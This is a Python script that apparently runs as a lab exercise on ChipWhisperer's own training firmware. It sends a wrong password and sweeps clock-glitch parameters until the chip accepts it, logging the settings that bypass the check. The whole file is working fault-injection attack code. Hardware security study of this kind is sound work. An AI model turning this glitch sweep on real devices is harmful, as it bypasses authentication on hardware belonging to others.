#!/usr/bin/env python3
"""Fault(進階):時脈毛刺繞過密碼驗證。
韌體正解密碼是 "touch";我們送「錯的」密碼,正常 passok=0(拒絕),
用毛刺讓晶片保持 passok=1(接受)= 身分驗證被繞過。"""
import time
import chipwhisperer as cw

HEX = "/Users/dot1000110/chipwhisperer/firmware/mcu/simpleserial-glitch/simpleserial-glitch-CWLITEARM.hex"
WRONG_PW = bytearray([0x00, 0x00, 0x00, 0x00, 0x00])   # 完全錯的密碼

def reset_target(scope):
    scope.io.nrst = "low"; time.sleep(0.03)
    scope.io.nrst = "high_z"; time.sleep(0.03)

scope = cw.scope(); scope.default_setup(); scope.adc.timeout = 0.1
target = cw.target(scope, cw.targets.SimpleSerial)
print(">>> 燒錄 glitch 韌體"); cw.program_target(scope, cw.programmers.STM32FProgrammer, HEX)
reset_target(scope)

# 先驗證:錯密碼正常應該被拒絕 (passok=0)
target.flush(); target.simpleserial_write("p", WRONG_PW); scope.capture()
base = target.simpleserial_read("r", 1, timeout=10)
print(">>> 無毛刺、送錯密碼的回應 passok =", None if base is None else base[0], "(0=拒絕,符合預期)")

scope.glitch.clk_src = "clkgen"; scope.glitch.output = "clock_xor"
scope.glitch.trigger_src = "ext_single"; scope.glitch.repeat = 1
scope.io.hs2 = "glitch"

def try_bypass(w, o, e):
    scope.glitch.width = w; scope.glitch.offset = o; scope.glitch.ext_offset = e
    target.flush(); scope.arm(); target.simpleserial_write("p", WRONG_PW)
    to = scope.capture(); val = target.simpleserial_read("r", 1, timeout=10)
    if to or val is None or len(val) < 1:
        return "reset", None
    return ("bypass" if val[0] == 1 else "reject"), val[0]

widths  = list(range(-12, 13, 2))
offsets = list(range(-10, 46, 3))
exts    = list(range(0, 40, 2))
bypasses, resets, rejects, attempts = [], 0, 0, 0
t0 = time.time()
print(f">>> 掃描 {len(widths)}×{len(offsets)}×{len(exts)} = {len(widths)*len(offsets)*len(exts)} 組(找到 10 組即停)")
done = False
for w in widths:
    for o in offsets:
        for e in exts:
            attempts += 1
            try:
                res, v = try_bypass(w, o, e)
            except Exception:
                reset_target(scope); resets += 1; continue
            if res == "bypass":
                bypasses.append((w, o, e))
                print(f"  *驗證繞過* width={w:>4} offset={o:>4} ext={e:>3}  →錯密碼卻回 passok=1")
                if len(bypasses) >= 10:
                    done = True; break
            elif res == "reset":
                resets += 1; reset_target(scope)
            else:
                rejects += 1
        if done: break
    if done: break

dt = time.time() - t0
print("\n=== 密碼繞過攻擊結果 ===")
print(f"嘗試 {attempts} 組,耗時 {dt:.1f}s")
print(f"驗證繞過(passok=1,錯密碼卻通過):{len(bypasses)}")
print(f"正常拒絕:{rejects}   當機:{resets}")
if bypasses:
    print("有效毛刺參數(前 10 筆):")
    for b in bypasses[:10]:
        print(f"   width={b[0]:>4} offset={b[1]:>4} ext={b[2]:>3}")
scope.dis(); target.dis()
